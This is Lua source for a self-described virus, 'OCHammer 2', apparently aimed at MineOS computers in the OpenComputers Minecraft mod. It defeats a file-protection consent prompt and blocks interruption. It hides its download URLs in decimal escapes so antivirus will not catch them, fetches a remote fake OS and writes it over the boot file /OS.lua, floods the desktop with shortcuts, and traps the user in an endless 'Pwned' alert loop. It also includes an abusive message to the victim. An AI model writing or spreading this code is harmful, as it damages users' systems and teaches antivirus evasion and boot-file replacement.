
-- Import libraries
local GUI = require("GUI")
local system = require("System")
local paths = require("Paths")
local com = require("Component")
local event = require("event")
local fs = require("Filesystem")
local internet = require("Internet")

local wait = event.sleep

-- OCHammer 2 virus
-- Copyright (c) 2022-2022 ocboy3

-- Why did Carl the NPC want to get the freaking gun?

-- Prevent Antivirus from detecting Boot file string by obfuscation

-- Prevent File Protector Beta from prompting user for consent via _G.fileprotect

function fp() _G.fileprotect = function(...) return true end end

-- Disable interruption so some dude can't delete this
event.interruptingEnabled = false

GUI.alert("NOTE: After Jul 10, 2025,\nOCHammer 2 will no longer be supported. Probably")
GUI.alert("This is not a joke app, continue?")
GUI.alert("SEND ABUSE REPORTS ON ROBLOX TO: Bwilmerilmeralt")
GUI.alert("i hope your ipad falls from the 9th floor of a old ussr apartament in latvia")

function fun()

  local cdir = fs.path(system.getCurrentScript())

  fp()
  internet.download("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\111\99\98\111\121\51\47\79\67\47\109\97\105\110\47\79\67\72\97\109\109\101\114\50\46\97\112\112\47\70\97\107\101\79\83\46\108\117\97","\47\79\83\46\108\117\97")
  
  fp()
  local IS_OS_DIR = fs.isDirectory("\47\77\105\110\101\79\83\47")
  
  if IS_OS_DIR == false then
    fp()
    fs.makeDirectory("\47\77\105\110\101\79\83\47")
  end
  
  fp()
  internet.download("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\111\99\98\111\121\51\47\79\67\47\109\97\105\110\47\79\67\72\97\109\109\101\114\50\46\97\112\112\47\80\76\69\65\83\69\37\50\48\82\69\65\68\37\50\48\77\69\46\116\120\116","\47\77\105\110\101\79\83\47\80\76\69\65\83\69\95\82\69\65\68\95\77\69\46\116\120\116") --  %20 = space

  -- spam a bunch of icons on the desktop
  for i = 1,30 do
    fp()
    system.createShortcut(paths.user.desktop .. "\80\76\69\65\83\69\95\82\69\65\68\95\77\69" .. tostring(i),"\47\77\105\110\101\79\83\47\80\76\69\65\83\69\95\82\69\65\68\95\77\69\46\116\120\116")
  end

  -- update the file list
  event.push("system","updateFileList")

  while true do
    local deadline = os.time()+1

    repeat
      computer.pullSignal(0.1)
    until os.time() >= deadline

    GUI.alert("Pwned by OCHammer 2")
    
  end
end

fun()
